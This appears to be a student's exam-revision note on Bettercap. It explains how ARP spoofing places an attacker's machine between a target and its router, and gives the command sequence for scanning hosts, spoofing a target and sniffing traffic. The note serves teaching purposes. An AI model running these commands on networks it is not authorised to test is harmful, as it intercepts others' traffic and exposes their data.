## Bettercap (ARP spoofing / MITM)

**Concept:** ARP has no authentication — any device can falsely claim to be another IP. Bettercap exploits this to sit between two devices (e.g. target + router) and intercept their traffic.

```
sudo apt install bettercap -y
sudo bettercap -iface eth0
> net.probe on                        # discover live hosts
> net.show                            # list discovered hosts
> set arp.spoof.targets <target-IP>   # pick target
> arp.spoof on                        # start MITM
> net.sniff on                        # capture traffic
> arp.spoof off                       # clean shutdown
> net.sniff off
> quit
```

**Viva one-liner:** *"Bettercap performs ARP spoofing to position the attacker's machine between two hosts, tricking both into routing traffic through the attacker — enabling sniffing or manipulation of unencrypted traffic."*

